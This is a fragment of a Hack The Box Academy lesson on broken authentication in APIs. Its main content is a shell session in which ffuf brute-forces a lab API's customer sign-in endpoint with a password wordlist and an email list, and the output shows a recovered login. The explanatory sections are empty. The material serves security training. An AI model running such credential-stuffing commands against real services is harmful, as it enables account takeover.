<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/268/section/3062
// Platform Version: V1
// Module ID: 268
// Module Name: API Attacks
// Module Difficulty: Medium
// Section ID: 3062
// Section Title: Broken Authentication
// Page Title: Hack The Box - Academy
// Page Number: 04
-->

# Broken Authentication

**Module Name:** API Attacks **Page Number:** 04

#### 

#### API ATTACKS

# Broken Authentication

## Improper Restriction of Excessive Authentication Attempts

### Scenario

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_1.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_1.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_2.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_2.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_3.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_3.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_4.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_4.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_5.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_5.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_6.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_6.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_7.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_7.png)

![https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_8.png](https://academy.hackthebox.com/storage/modules/268/API2_2023_Broken_Authentication_Image_8.png)

``` shell-session
lbek@htb[/htb]$ ffuf -w /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt:PASS -w customerEmails.txt:EMAIL -u http://94.237.59.63:31874/api/v1/authentication/customers/sign-in -X POST -H "Content-Type: application/json" -d '{"Email": "EMAIL", "Password": "PASS"}' -fr "Invalid Credentials" -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.59.63:31874/api/v1/authentication/customers/sign-in
 :: Wordlist         : PASS: /opt/useful/seclists/Passwords/xato-net-10-million-passwords-10000.txt
 :: Wordlist         : EMAIL: /home/htb-ac-413848/customerEmails.txt
 :: Header           : Content-Type: application/json
 :: Data             : {"Email": "EMAIL", "Password": "PASS"}
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Invalid Credentials
________________________________________________

[Status: 200, Size: 393, Words: 1, Lines: 1, Duration: 81ms]
    * EMAIL: IsabellaRichardson@gmail.com
    * PASS: qwerasdfzxcv

:: Progress: [30000/30000] :: Job [1/1] :: 1275 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
```

### Brute-forcing OTPs and Answers of Security Questions

### Prevention

# 

# 

#### Questions

####